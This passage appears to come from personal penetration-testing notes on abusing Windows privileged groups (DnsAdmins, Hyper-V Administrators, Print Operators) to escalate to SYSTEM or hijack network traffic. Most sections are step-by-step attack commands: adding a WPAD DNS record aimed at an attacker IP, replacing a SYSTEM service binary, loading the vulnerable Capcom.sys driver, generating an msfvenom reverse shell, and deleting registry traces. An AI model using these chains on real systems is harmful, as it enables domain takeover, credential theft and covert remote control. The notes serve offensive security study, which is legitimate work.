system("ENTER COMMAND HERE");
```

Useful for:

* Reverse shells
* Command execution on query
* Credential harvesting


## 🌐 WPAD Record Attack (DnsAdmins Abuse #2)

DnsAdmins members can:

* Disable the **Global Query Block List**
* Add a **WPAD** record

This enables **network-wide traffic hijacking** using tools like:

* Responder
* Inveigh

### 1. Disable Query Block List

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.domain.local
```

### 2. Add WPAD DNS record

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName domain.local \
  -ComputerName dc01.domain.local -IPv4Address 10.10.14.3
```

---

# 📝 Hyper-V Administrators — Notes

## 🔍 Overview

* Members of the **Hyper-V Administrators** group have full administrative access to all Hyper-V virtualization features.
* If **Domain Controllers are virtualized**, Hyper-V admins should be treated as **Domain Admin–equivalent**, because they can:

  * Clone a running Domain Controller.
  * Mount the copied **.vhdx** disk offline.
  * Extract **NTDS.dit**, then dump **NTLM password hashes** for *all domain accounts*.

## 🛠️ Privilege Escalation Vector: Hard-Link Abuse

### 🧩 Background

* When a VM is deleted, **vmms.exe** (Hyper-V Virtual Machine Management Service) attempts to restore original permissions on its corresponding `.vhdx` file.
* This operation runs as **NT AUTHORITY\SYSTEM**.
* If we can create a **native hard link** where that `.vhdx` file used to be, we can redirect the permission restore operation to **any SYSTEM-protected file**, giving us full control.

### Vulnerable scenarios:

* Systems vulnerable to:

  * **CVE-2018-0952**
  * **CVE-2019-0841**
* Or systems that have **services running as SYSTEM** which are startable by non-admin users.


## 🧪 Example Exploit Path Using Mozilla Maintenance Service

### 🎯 Target File

Firefox installs:

```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

This service:

* Runs as **NT AUTHORITY\SYSTEM**
* Can be **started by unprivileged users**
* Is ideal for replacing with a malicious binary once permissions are obtained.


## 🔧 Exploitation Steps

### 1. Create Native Hard Link (After VM Delete Scenario)

* Use an NTFS hard-link PoC to force SYSTEM to reset permissions on a file we choose (ex: maintenanceservice.exe).
* After this step, we gain **full permissions** on the file.

### 2. Take Ownership

```cmd
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

### 3. Replace With Malicious Executable

* Swap the legitimate binary with a malicious **maintenanceservice.exe** that executes any SYSTEM-level payload:

  * Reverse shell
  * Add local admin
  * Dump SAM, etc.


### 4. Start the Service

```cmd
sc.exe start MozillaMaintenance
```

This executes the malicious binary as **SYSTEM**, granting full privilege escalation.

---

# 📝 Print Operators

## 🔍 Overview

* Members of the **Print Operators** group have high privileges on Domain Controllers.
* Key capabilities include:

  * Local logon to Domain Controllers
  * Shutdown system
  * Manage/create/delete printers
  * **SeLoadDriverPrivilege** — ability to load kernel drivers
* By default, SeLoadDriverPrivilege is present but **requires elevated/UAC-bypassed context** to be visible.

This privilege allows loading **malicious or vulnerable drivers**, enabling **kernel-level privilege escalation to SYSTEM**.



## 🔑 Privilege Enumeration

### 1. Check privileges (non-elevated)

```cmd
whoami /priv
```

Typical result:

* **SeLoadDriverPrivilege not shown**
* Requires UAC bypass or elevated prompt to access it.


### 2. After UAC bypass / Admin elevation

```cmd
whoami /priv
```

You will now see:

```
SeLoadDriverPrivilege (Disabled)
```

Even though disabled, it can be programmatically **enabled** and then abused.


## 🚀 Exploitation via Capcom.sys (Kernel Vulnerable Driver)

### 🔥 Why Capcom.sys?

* Contains a vulnerable IOCTL that enables **arbitrary kernel code execution**.
* Allows an unprivileged user (if allowed to load the driver) to escalate to SYSTEM.
* Print Operators → SeLoadDriverPrivilege → driver loading → SYSTEM shell.



## 🧪 Exploit Workflow

### 1. Enable SeLoadDriverPrivilege Programmatically

Use provided C++ PoC:

### Edit the include headers:

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

### Compile using Visual Studio Developer Command Prompt

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

This creates:
`EnableSeLoadDriverPrivilege.exe`


### 2. Prepare Registry Entry for Malicious Driver

Download **Capcom.sys** and place it at:

```
C:\Tools\Capcom.sys
```

Add registry references under **HKEY_CURRENT_USER** (HKCU):

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Notes:

* `\??\` is an NT Object Path.
* Win32 resolves it correctly when loading kernel drivers.

### 3. Verify Driver Not Loaded (Optional)

Using DriverView:

```powershell
.\DriverView.exe /stext drivers.txt
Select-String -Path drivers.txt -Pattern Capcom
```


### 4. Enable the Privilege & Load Driver

```cmd
EnableSeLoadDriverPrivilege.exe
```

Expected output:

* SeLoadDriverPrivilege = **Enabled**
* Registry driver entry recognized


### 5. Verify Driver Loaded

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String Capcom
```

You should now see:

```
Driver Name: Capcom.sys
Filename: C:\Tools\Capcom.sys
```


## 💥 Exploit the Driver to Get SYSTEM

Compile ExploitCapcom and run:

```powershell
.\ExploitCapcom.exe
```

Expected output:

```
[+] Shellcode executed
[+] Token stealing successful
[+] SYSTEM shell launched
```

You now have an **NT AUTHORITY\SYSTEM** command shell.


## 🛠️ Alternate Non-GUI Method

If you don't have a GUI (no DriverView):

Modify `ExploitCapcom.cpp`:

### Original:

```c
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

### Change to reverse shell payload:

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Generate payload with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o revshell.exe
```

Run listener, execute ExploitCapcom.exe, and get SYSTEM back.


## 🤖 Automating the Process: EoPLoadDriver

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

This tool:

* Enables SeLoadDriverPrivilege
* Creates registry entries
* Loads the driver automatically

Then simply run:

```cmd
ExploitCapcom.exe
```


## 🧹 Clean-Up

Remove registry traces:

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

Confirm deletion:

```
Yes
```

---
